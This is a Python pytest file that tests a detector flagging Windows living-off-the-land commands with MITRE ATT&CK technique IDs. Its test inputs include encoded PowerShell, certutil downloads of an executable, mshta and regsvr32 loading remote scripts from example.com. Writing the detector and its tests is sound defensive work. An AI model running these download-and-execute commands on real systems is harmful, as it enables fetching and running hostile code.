from src.detector import analyze_command
import pytest


@pytest.mark.parametrize(
        "command",
        [
            "whoami",
            "notepad.exe",
            "echo powershell -enc",
            "echo certutil -urlcache",
            "echo mshta https://example.com/file.hta",
            "powershell Get-Process",
            "certutil -store My"
        ]
)
def test_no_false_positive_for_examples(command):
    result = analyze_command(command)

    assert result == []


@pytest.mark.parametrize(
        "command,expected_technique",
        [
            ("powershell.exe -enc SQBFAFgA", "T1059.001"),
            ("powershell -EncodedCommand SQBFAFgA", "T1059.001"),
            ("pwsh -enc SQBFAFgA", "T1059.001"),
            ("certutil.exe -urlcache -split -f https://example.com/a.exe", "T1105"),
            ("mshta.exe https://example.com/a.hta", "T1218.005")
        ]
)
def test_suspicious_commands(command, expected_technique):
    result = analyze_command(command)

    assert len(result) >= 1

    assert any(
        alert["mitre_technique"] == expected_technique
        for alert in result
    )


def test_normal_command():
    result = analyze_command("notepad.exe")

    assert result == []


def test_powershell_detection():
    result = analyze_command("powershell -enc SQBFAFgA")

    assert len(result) == 1
    assert result[0]["severity"] == "High"
    assert result[0]["mitre_technique"] == "T1059.001"


def test_certutil_detection():
    result = analyze_command(
        "certutil -urlcache -split -f http://example.com/a.exe"
    )

    assert len(result) == 1
    assert result[0]["mitre_technique"] == "T1105"


def test_mshta_detection():
    result = analyze_command(
        "mshta https://example.com/a.hta"
    )

    assert len(result) == 1
    assert result[0]["mitre_technique"] == "T1218.005"



def test_regsvr32_detection():
    command = (
        "regsvr32.exe /s /n /u "
        "/i:https://example.com/test.sct scrobj.dll"
    )

    result = analyze_command(command)

    assert len(result) == 1
    assert result[0]["rule_id"] == "LOL-004"
    assert result[0]["mitre_technique"] == "T1218.010"
